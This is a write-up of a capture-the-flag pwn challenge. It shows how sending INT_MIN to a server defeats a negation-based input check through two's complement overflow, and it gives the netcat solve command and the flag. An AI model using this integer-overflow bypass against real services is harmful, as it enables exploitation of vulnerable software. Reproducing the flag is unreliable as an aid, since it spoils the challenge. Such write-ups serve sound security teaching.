# Coming Together (PWN)

## Challenge Description

> What number will you contribute?

**Server:** `nc oq7qaruz5vsw.boroctf.com 25287`  
**Binary:** ELF 64-bit, not stripped  
**Protections:** Canary · NX · PIE · Full RELRO  
**Flag Format:** `boroCTF{...}`

## TL;DR

The server adds a hardcoded `2` to the user's input and prints the flag if the total is negative. Input validation clamps values >10000 to 1 and negates negatives — but `negl(-2147483648)` silently overflows back to `-2147483648` (two's complement minimum), making the total negative and triggering the flag.

## Initial Analysis

### Step 1: Interact with the server

```bash
nc oq7qaruz5vsw.boroctf.com 25287
# What number will you contribute?
2
# Our total is 4! Good work everyone!
```

Server contributes a fixed value of `2`. The response "Our total is 4" confirms `total = server_val + input`.

### Step 2: Binary triage

```bash
strings chal | grep flag
# flag.txt  ← reference found
nm chal | grep "T "
# only main listed — no win function
```

### Step 3: Disassemble main

```bash
objdump -d chal | grep -A 100 "<main>:"
```

Key logic from the disassembly:

| Condition | Behaviour |
|-----------|-----------|
| `input > 0x2710` (10000) | clamped to 1 |
| `input < 0` | negated via `negl` instruction |
| `total < 0` | opens `flag.txt` and prints it |
| `total >= 0` | prints "Our total is %d!" |

**Goal:** reach the `total < 0` branch.

### Step 4: Identify the two's complement overflow

The `negl` instruction computes two's complement negation: `result = 0 - input`.

For `INT_MIN = -2147483648`:

```
negl(-2147483648)  ==>  0 - (-2147483648)  ==>  +2147483648
```

`+2147483648` does not fit in a signed 32-bit integer — it wraps back to `-2147483648`. The CPU sets the overflow flag but the program never checks it.

```
total = 2 + (-2147483648) = -2147483646 < 0  ✓  flag branch taken
```

## Solution

### Step 5: Send INT_MIN

```bash
echo "-2147483648" | nc oq7qaruz5vsw.boroctf.com 25287
```

Output:

```
What number will you contribute?
No negatives! Huh? That's not supposed to happen. boroCTF{tw0s_c0mpl3men+_M3}
```

## Flag

```
boroCTF{tw0s_c0mpl3men+_M3}
```

## Key Takeaways

- **`negl(INT_MIN)` overflows silently** — two's complement negation of the minimum signed integer wraps to itself. A sanitization check that negates a value to "make it positive" is broken at exactly this one boundary.
- **32-bit arithmetic in 64-bit code** — the `negl` instruction operated on a 32-bit register. Always check register widths; 64-bit overflow semantics are different.
- **Arithmetic sanitization ≠ arithmetic safety** — clamping and negating look safe but have exploitable edge cases at integer boundaries.

## Tools Used

- `nc` (netcat) — server interaction and exploit delivery
- `strings`, `nm` — binary triage
- `objdump` — static disassembly of main logic
